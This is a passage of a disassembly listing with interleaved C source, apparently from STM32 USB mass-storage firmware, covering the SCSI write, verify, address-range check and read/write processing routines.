 800ab88:	781b      	ldrb	r3, [r3, #0]
 800ab8a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800ab8c:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800ab8e:	687a      	ldr	r2, [r7, #4]
 800ab90:	3205      	adds	r2, #5
 800ab92:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800ab94:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800ab96:	697a      	ldr	r2, [r7, #20]
 800ab98:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ab9c:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800ab9e:	687b      	ldr	r3, [r7, #4]
 800aba0:	3306      	adds	r3, #6
 800aba2:	781b      	ldrb	r3, [r3, #0]
 800aba4:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800aba6:	687b      	ldr	r3, [r7, #4]
 800aba8:	3307      	adds	r3, #7
 800abaa:	781b      	ldrb	r3, [r3, #0]
 800abac:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800abae:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800abb0:	687b      	ldr	r3, [r7, #4]
 800abb2:	3308      	adds	r3, #8
 800abb4:	781b      	ldrb	r3, [r3, #0]
 800abb6:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800abb8:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800abba:	687a      	ldr	r2, [r7, #4]
 800abbc:	3209      	adds	r2, #9
 800abbe:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800abc0:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800abc2:	697a      	ldr	r2, [r7, #20]
 800abc4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800abc8:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800abca:	697b      	ldr	r3, [r7, #20]
 800abcc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abd0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800abd2:	697b      	ldr	r3, [r7, #20]
 800abd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abd8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800abda:	7af9      	ldrb	r1, [r7, #11]
 800abdc:	68f8      	ldr	r0, [r7, #12]
 800abde:	f000 f886 	bl	800acee <SCSI_CheckAddressRange>
 800abe2:	4603      	mov	r3, r0
 800abe4:	2b00      	cmp	r3, #0
 800abe6:	da02      	bge.n	800abee <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800abe8:	f04f 33ff 	mov.w	r3, #4294967295
 800abec:	e039      	b.n	800ac62 <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800abee:	697b      	ldr	r3, [r7, #20]
 800abf0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abf4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800abf6:	697a      	ldr	r2, [r7, #20]
 800abf8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800abfc:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ac00:	fb02 f303 	mul.w	r3, r2, r3
 800ac04:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800ac06:	697b      	ldr	r3, [r7, #20]
 800ac08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac0c:	699b      	ldr	r3, [r3, #24]
 800ac0e:	693a      	ldr	r2, [r7, #16]
 800ac10:	429a      	cmp	r2, r3
 800ac12:	d00b      	beq.n	800ac2c <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800ac14:	697b      	ldr	r3, [r7, #20]
 800ac16:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac1a:	7f59      	ldrb	r1, [r3, #29]
 800ac1c:	2320      	movs	r3, #32
 800ac1e:	2205      	movs	r2, #5
 800ac20:	68f8      	ldr	r0, [r7, #12]
 800ac22:	f7ff fbeb 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800ac26:	f04f 33ff 	mov.w	r3, #4294967295
 800ac2a:	e01a      	b.n	800ac62 <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800ac2c:	693b      	ldr	r3, [r7, #16]
 800ac2e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ac32:	bf28      	it	cs
 800ac34:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ac38:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800ac3a:	697b      	ldr	r3, [r7, #20]
 800ac3c:	2201      	movs	r2, #1
 800ac3e:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ac40:	4b0a      	ldr	r3, [pc, #40]	; (800ac6c <SCSI_Write12+0x1e4>)
 800ac42:	7819      	ldrb	r1, [r3, #0]
 800ac44:	697b      	ldr	r3, [r7, #20]
 800ac46:	f103 0210 	add.w	r2, r3, #16
 800ac4a:	693b      	ldr	r3, [r7, #16]
 800ac4c:	68f8      	ldr	r0, [r7, #12]
 800ac4e:	f002 f9ff 	bl	800d050 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800ac52:	2300      	movs	r3, #0
 800ac54:	e005      	b.n	800ac62 <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800ac56:	7afb      	ldrb	r3, [r7, #11]
 800ac58:	4619      	mov	r1, r3
 800ac5a:	68f8      	ldr	r0, [r7, #12]
 800ac5c:	f000 f90a 	bl	800ae74 <SCSI_ProcessWrite>
 800ac60:	4603      	mov	r3, r0
}
 800ac62:	4618      	mov	r0, r3
 800ac64:	3718      	adds	r7, #24
 800ac66:	46bd      	mov	sp, r7
 800ac68:	bd80      	pop	{r7, pc}
 800ac6a:	bf00      	nop
 800ac6c:	2000010b 	.word	0x2000010b

0800ac70 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800ac70:	b580      	push	{r7, lr}
 800ac72:	b086      	sub	sp, #24
 800ac74:	af00      	add	r7, sp, #0
 800ac76:	60f8      	str	r0, [r7, #12]
 800ac78:	460b      	mov	r3, r1
 800ac7a:	607a      	str	r2, [r7, #4]
 800ac7c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ac7e:	68fb      	ldr	r3, [r7, #12]
 800ac80:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ac84:	68fb      	ldr	r3, [r7, #12]
 800ac86:	32b0      	adds	r2, #176	; 0xb0
 800ac88:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ac8c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ac8e:	697b      	ldr	r3, [r7, #20]
 800ac90:	2b00      	cmp	r3, #0
 800ac92:	d102      	bne.n	800ac9a <SCSI_Verify10+0x2a>
  {
    return -1;
 800ac94:	f04f 33ff 	mov.w	r3, #4294967295
 800ac98:	e025      	b.n	800ace6 <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800ac9a:	687b      	ldr	r3, [r7, #4]
 800ac9c:	3301      	adds	r3, #1
 800ac9e:	781b      	ldrb	r3, [r3, #0]
 800aca0:	f003 0302 	and.w	r3, r3, #2
 800aca4:	2b00      	cmp	r3, #0
 800aca6:	d008      	beq.n	800acba <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800aca8:	7af9      	ldrb	r1, [r7, #11]
 800acaa:	2324      	movs	r3, #36	; 0x24
 800acac:	2205      	movs	r2, #5
 800acae:	68f8      	ldr	r0, [r7, #12]
 800acb0:	f7ff fba4 	bl	800a3fc <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800acb4:	f04f 33ff 	mov.w	r3, #4294967295
 800acb8:	e015      	b.n	800ace6 <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800acba:	697b      	ldr	r3, [r7, #20]
 800acbc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acc0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800acc2:	697b      	ldr	r3, [r7, #20]
 800acc4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acc8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800acca:	7af9      	ldrb	r1, [r7, #11]
 800accc:	68f8      	ldr	r0, [r7, #12]
 800acce:	f000 f80e 	bl	800acee <SCSI_CheckAddressRange>
 800acd2:	4603      	mov	r3, r0
 800acd4:	2b00      	cmp	r3, #0
 800acd6:	da02      	bge.n	800acde <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800acd8:	f04f 33ff 	mov.w	r3, #4294967295
 800acdc:	e003      	b.n	800ace6 <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800acde:	697b      	ldr	r3, [r7, #20]
 800ace0:	2200      	movs	r2, #0
 800ace2:	60da      	str	r2, [r3, #12]

  return 0;
 800ace4:	2300      	movs	r3, #0
}
 800ace6:	4618      	mov	r0, r3
 800ace8:	3718      	adds	r7, #24
 800acea:	46bd      	mov	sp, r7
 800acec:	bd80      	pop	{r7, pc}

0800acee <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800acee:	b580      	push	{r7, lr}
 800acf0:	b086      	sub	sp, #24
 800acf2:	af00      	add	r7, sp, #0
 800acf4:	60f8      	str	r0, [r7, #12]
 800acf6:	607a      	str	r2, [r7, #4]
 800acf8:	603b      	str	r3, [r7, #0]
 800acfa:	460b      	mov	r3, r1
 800acfc:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800acfe:	68fb      	ldr	r3, [r7, #12]
 800ad00:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad04:	68fb      	ldr	r3, [r7, #12]
 800ad06:	32b0      	adds	r2, #176	; 0xb0
 800ad08:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad0c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ad0e:	697b      	ldr	r3, [r7, #20]
 800ad10:	2b00      	cmp	r3, #0
 800ad12:	d102      	bne.n	800ad1a <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ad14:	f04f 33ff 	mov.w	r3, #4294967295
 800ad18:	e012      	b.n	800ad40 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ad1a:	687a      	ldr	r2, [r7, #4]
 800ad1c:	683b      	ldr	r3, [r7, #0]
 800ad1e:	441a      	add	r2, r3
 800ad20:	697b      	ldr	r3, [r7, #20]
 800ad22:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad26:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ad28:	429a      	cmp	r2, r3
 800ad2a:	d908      	bls.n	800ad3e <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ad2c:	7af9      	ldrb	r1, [r7, #11]
 800ad2e:	2321      	movs	r3, #33	; 0x21
 800ad30:	2205      	movs	r2, #5
 800ad32:	68f8      	ldr	r0, [r7, #12]
 800ad34:	f7ff fb62 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 800ad38:	f04f 33ff 	mov.w	r3, #4294967295
 800ad3c:	e000      	b.n	800ad40 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800ad3e:	2300      	movs	r3, #0
}
 800ad40:	4618      	mov	r0, r3
 800ad42:	3718      	adds	r7, #24
 800ad44:	46bd      	mov	sp, r7
 800ad46:	bd80      	pop	{r7, pc}

0800ad48 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ad48:	b590      	push	{r4, r7, lr}
 800ad4a:	b085      	sub	sp, #20
 800ad4c:	af00      	add	r7, sp, #0
 800ad4e:	6078      	str	r0, [r7, #4]
 800ad50:	460b      	mov	r3, r1
 800ad52:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ad54:	687b      	ldr	r3, [r7, #4]
 800ad56:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad5a:	687b      	ldr	r3, [r7, #4]
 800ad5c:	32b0      	adds	r2, #176	; 0xb0
 800ad5e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad62:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ad64:	68fb      	ldr	r3, [r7, #12]
 800ad66:	2b00      	cmp	r3, #0
 800ad68:	d102      	bne.n	800ad70 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ad6a:	f04f 33ff 	mov.w	r3, #4294967295
 800ad6e:	e07b      	b.n	800ae68 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ad70:	68fb      	ldr	r3, [r7, #12]
 800ad72:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad76:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad78:	68fa      	ldr	r2, [r7, #12]
 800ad7a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad7e:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad82:	fb02 f303 	mul.w	r3, r2, r3
 800ad86:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ad88:	68bb      	ldr	r3, [r7, #8]
 800ad8a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ad8e:	bf28      	it	cs
 800ad90:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ad94:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ad96:	687b      	ldr	r3, [r7, #4]
 800ad98:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ad9c:	687a      	ldr	r2, [r7, #4]
 800ad9e:	33b0      	adds	r3, #176	; 0xb0
 800ada0:	009b      	lsls	r3, r3, #2
 800ada2:	4413      	add	r3, r2
 800ada4:	685b      	ldr	r3, [r3, #4]
 800ada6:	691c      	ldr	r4, [r3, #16]
 800ada8:	68fb      	ldr	r3, [r7, #12]
 800adaa:	f103 0110 	add.w	r1, r3, #16
 800adae:	68fb      	ldr	r3, [r7, #12]
 800adb0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adb4:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800adb6:	68fb      	ldr	r3, [r7, #12]
 800adb8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adbc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800adc0:	4618      	mov	r0, r3
 800adc2:	68bb      	ldr	r3, [r7, #8]
 800adc4:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800adc8:	b29b      	uxth	r3, r3
 800adca:	78f8      	ldrb	r0, [r7, #3]
 800adcc:	47a0      	blx	r4
 800adce:	4603      	mov	r3, r0
 800add0:	2b00      	cmp	r3, #0
 800add2:	da08      	bge.n	800ade6 <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800add4:	78f9      	ldrb	r1, [r7, #3]
 800add6:	2311      	movs	r3, #17
 800add8:	2204      	movs	r2, #4
 800adda:	6878      	ldr	r0, [r7, #4]
 800addc:	f7ff fb0e 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 800ade0:	f04f 33ff 	mov.w	r3, #4294967295
 800ade4:	e040      	b.n	800ae68 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ade6:	4b22      	ldr	r3, [pc, #136]	; (800ae70 <SCSI_ProcessRead+0x128>)
 800ade8:	7819      	ldrb	r1, [r3, #0]
 800adea:	68fb      	ldr	r3, [r7, #12]
 800adec:	f103 0210 	add.w	r2, r3, #16
 800adf0:	68bb      	ldr	r3, [r7, #8]
 800adf2:	6878      	ldr	r0, [r7, #4]
 800adf4:	f002 f8f4 	bl	800cfe0 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800adf8:	68fb      	ldr	r3, [r7, #12]
 800adfa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adfe:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ae00:	68fb      	ldr	r3, [r7, #12]
 800ae02:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae06:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae0a:	4619      	mov	r1, r3
 800ae0c:	68bb      	ldr	r3, [r7, #8]
 800ae0e:	fbb3 f3f1 	udiv	r3, r3, r1
 800ae12:	4413      	add	r3, r2
 800ae14:	68fa      	ldr	r2, [r7, #12]
 800ae16:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae1a:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ae1c:	68fb      	ldr	r3, [r7, #12]
 800ae1e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae22:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ae24:	68fb      	ldr	r3, [r7, #12]
 800ae26:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae2a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ae2e:	4619      	mov	r1, r3
 800ae30:	68bb      	ldr	r3, [r7, #8]
 800ae32:	fbb3 f3f1 	udiv	r3, r3, r1
 800ae36:	1ad3      	subs	r3, r2, r3
 800ae38:	68fa      	ldr	r2, [r7, #12]
 800ae3a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae3e:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800ae40:	68fb      	ldr	r3, [r7, #12]
 800ae42:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae46:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ae48:	68bb      	ldr	r3, [r7, #8]
 800ae4a:	1ad3      	subs	r3, r2, r3
 800ae4c:	68fa      	ldr	r2, [r7, #12]
 800ae4e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae52:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ae54:	68fb      	ldr	r3, [r7, #12]
 800ae56:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae5a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ae5c:	2b00      	cmp	r3, #0
 800ae5e:	d102      	bne.n	800ae66 <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ae60:	68fb      	ldr	r3, [r7, #12]
 800ae62:	2203      	movs	r2, #3
 800ae64:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800ae66:	2300      	movs	r3, #0
}
 800ae68:	4618      	mov	r0, r3
 800ae6a:	3714      	adds	r7, #20
 800ae6c:	46bd      	mov	sp, r7
 800ae6e:	bd90      	pop	{r4, r7, pc}
 800ae70:	2000010a 	.word	0x2000010a

0800ae74 <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ae74:	b590      	push	{r4, r7, lr}
 800ae76:	b085      	sub	sp, #20
 800ae78:	af00      	add	r7, sp, #0
 800ae7a:	6078      	str	r0, [r7, #4]
 800ae7c:	460b      	mov	r3, r1
 800ae7e:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ae80:	687b      	ldr	r3, [r7, #4]
 800ae82:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ae86:	687b      	ldr	r3, [r7, #4]
 800ae88:	32b0      	adds	r2, #176	; 0xb0
 800ae8a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ae8e:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ae90:	68fb      	ldr	r3, [r7, #12]
 800ae92:	2b00      	cmp	r3, #0
 800ae94:	d102      	bne.n	800ae9c <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ae96:	f04f 33ff 	mov.w	r3, #4294967295
 800ae9a:	e08e      	b.n	800afba <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ae9c:	68fb      	ldr	r3, [r7, #12]
 800ae9e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aea2:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aea4:	68fa      	ldr	r2, [r7, #12]
 800aea6:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aeaa:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aeae:	fb02 f303 	mul.w	r3, r2, r3
 800aeb2:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800aeb4:	68bb      	ldr	r3, [r7, #8]
 800aeb6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aeba:	bf28      	it	cs
 800aebc:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aec0:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800aec2:	687b      	ldr	r3, [r7, #4]
 800aec4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800aec8:	687a      	ldr	r2, [r7, #4]
 800aeca:	33b0      	adds	r3, #176	; 0xb0
 800aecc:	009b      	lsls	r3, r3, #2
 800aece:	4413      	add	r3, r2
 800aed0:	685b      	ldr	r3, [r3, #4]
 800aed2:	695c      	ldr	r4, [r3, #20]
 800aed4:	68fb      	ldr	r3, [r7, #12]
 800aed6:	f103 0110 	add.w	r1, r3, #16
 800aeda:	68fb      	ldr	r3, [r7, #12]
 800aedc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aee0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800aee2:	68fb      	ldr	r3, [r7, #12]
 800aee4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aee8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800aeec:	4618      	mov	r0, r3
 800aeee:	68bb      	ldr	r3, [r7, #8]
 800aef0:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800aef4:	b29b      	uxth	r3, r3
 800aef6:	78f8      	ldrb	r0, [r7, #3]
 800aef8:	47a0      	blx	r4
 800aefa:	4603      	mov	r3, r0
 800aefc:	2b00      	cmp	r3, #0
 800aefe:	da08      	bge.n	800af12 <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800af00:	78f9      	ldrb	r1, [r7, #3]
 800af02:	2303      	movs	r3, #3
 800af04:	2204      	movs	r2, #4
 800af06:	6878      	ldr	r0, [r7, #4]
 800af08:	f7ff fa78 	bl	800a3fc <SCSI_SenseCode>
    return -1;
 800af0c:	f04f 33ff 	mov.w	r3, #4294967295
 800af10:	e053      	b.n	800afba <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800af12:	68fb      	ldr	r3, [r7, #12]
 800af14:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af18:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800af1a:	68fb      	ldr	r3, [r7, #12]
 800af1c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af20:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800af24:	4619      	mov	r1, r3
 800af26:	68bb      	ldr	r3, [r7, #8]
 800af28:	fbb3 f3f1 	udiv	r3, r3, r1
 800af2c:	4413      	add	r3, r2
 800af2e:	68fa      	ldr	r2, [r7, #12]
 800af30:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af34:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800af36:	68fb      	ldr	r3, [r7, #12]
 800af38:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af3c:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800af3e:	68fb      	ldr	r3, [r7, #12]
 800af40:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af44:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800af48:	4619      	mov	r1, r3
 800af4a:	68bb      	ldr	r3, [r7, #8]
 800af4c:	fbb3 f3f1 	udiv	r3, r3, r1
 800af50:	1ad3      	subs	r3, r2, r3
 800af52:	68fa      	ldr	r2, [r7, #12]
 800af54:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af58:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800af5a:	68fb      	ldr	r3, [r7, #12]
 800af5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af60:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800af62:	68bb      	ldr	r3, [r7, #8]
 800af64:	1ad3      	subs	r3, r2, r3
 800af66:	68fa      	ldr	r2, [r7, #12]
 800af68:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af6c:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800af6e:	68fb      	ldr	r3, [r7, #12]
 800af70:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af74:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af76:	2b00      	cmp	r3, #0
 800af78:	d104      	bne.n	800af84 <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800af7a:	2100      	movs	r1, #0
 800af7c:	6878      	ldr	r0, [r7, #4]
 800af7e:	f7fe fc53 	bl	8009828 <MSC_BOT_SendCSW>
 800af82:	e019      	b.n	800afb8 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800af84:	68fb      	ldr	r3, [r7, #12]
 800af86:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800af8a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800af8c:	68fa      	ldr	r2, [r7, #12]
 800af8e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800af92:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800af96:	fb02 f303 	mul.w	r3, r2, r3
 800af9a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
